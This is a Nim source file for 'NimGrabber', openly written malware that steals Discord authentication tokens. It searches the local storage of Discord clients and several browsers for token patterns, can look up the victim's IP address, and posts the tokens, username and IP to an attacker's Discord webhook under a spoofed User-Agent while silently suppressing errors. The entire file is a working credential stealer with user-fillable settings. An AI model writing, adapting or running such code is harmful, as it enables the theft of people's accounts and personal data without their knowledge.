# ============ #
# NullCode1337 #
# ============ #
import json, puppy, os, regex, strformat
from sequtils import deduplicate, concat
from strutils import replace, endswith, strip

# User fillable variables
# -----------------------
let 
  webhook = "https://discord.com/api/webhooks/489398398492932/you-only-live-once"
  user_id: int64 = 87284798287919821
  
    #> Possible options for these: "Y, N"
const 
  sendIP: char = 'N' ## Send IP Address to webhook 
  embed:  char = 'N' ## Send the tokens in a fancy embed
  check:  char = 'N' ## Check the tokens in victim's PC [INCOMPLETE]
  
# Do not touch the following
# --------------------------
var
  tkpaths: seq[string] = @[]
  tokens : seq[string] = @[]
  hooktks = ""

let 
  roaming = getenv("appdata")
  local   = getenv("localappdata")
  user    = getenv("username") 
  
  paths   = [
    roaming / "Discord", 
    roaming / "discordcanary", 
    roaming / "Lightcord",
    roaming / "discordptb",
    roaming / "Opera Software" / "Opera Stable",
    roaming / "Opera Software" / "Opera GX Stable",
    local / "Vivaldi" / "User Data" / "Default",       
    local / "Microsoft" / "Edge" / "User Data" / "Default",  
    local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
    local / "Google" / "Chrome" / "User Data" / "Default",
    local / "Yandex" / "YandexBrowser" / "User Data" / "Default", 
  ]
  
const reg = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]


for path in paths:
   var path = path & r"\Local Storage\leveldb"
   if dirExists(path):
      try: ## Stage 1: Finding paths for all the files
         setCurrentDir(path)
         for file in walkDirRec path:
            if file.endswith("log"):   
               tkpaths.add(file)
            elif file.endswith("ldb"): 
               tkpaths.add(file)
            else: continue
      except OSError: continue
      
      for file in tkpaths: ## Stage 2: We do some regexing
         var cont = file.readFile
         cont = cont.replace("\n", "")
         for r in reg:
            for f in findAll(cont, r):
               tokens.add cont[f.boundaries]
   else: continue


if tokens.len == 0: ## Just in case no token ever gets found 
    tokens.add("No tokens found!") 
    
tokens = tokens.deduplicate ## Prepare tokens for uploading
for c in tokens: hooktks.add(c & "\n")
hooktks = &"```\n{hooktks.strip(leading=false)}```"


when sendIP == 'Y': 
    let ip: string = fetch("https://api.ipify.org/")
    let begin = &"<@{user_id}> Victim: **{user}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
else:
    let ip: string = "Not Enabled"
    let begin = &"<@{user_id}> Victim: **{user}**\n**__Tokens grabbed by NimGrabber__**:\n"
    
when embed == 'Y':
    var data = %*{ 
        "username": "Nim666", 
        "content": &"<@{user_id}>",
        "embeds": [
            { 
                "title": "__**NimGrabber (By NullCode)**__",
                "fields": [
                    {
                        "name": "[*] Victim",
                        "value": "**" & user & "**",
                        "inline": true

                    },
                    {
                        "name": "[*] IP Address",
                        "value": "**" & ip & "**",
                        "inline": true
                    }
                ]
            },
            {
                "title": "__**Tokens Grabbed:**__",
                "fields": [
                    {
                        "name": "Total tokens: " & $tokens.len, 
                        "value": hooktks
                    },
                ]
            }
        ]
    }
else: 
    var data = %*{ "content": begin & hooktks, "username": "Nim666" }


let post = Request( ## Upload said tokens
   url: parseUrl(webhook),
   verb: "POST",
   headers: @[Header(
      key: "Content-Type", 
      value: "application/json"
   ), Header(
      key: "User-Agent",
      value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
   )],
   body: $data
)

# Nice and fluffy bandage
try: discard fetch(post)
except PuppyError: discard
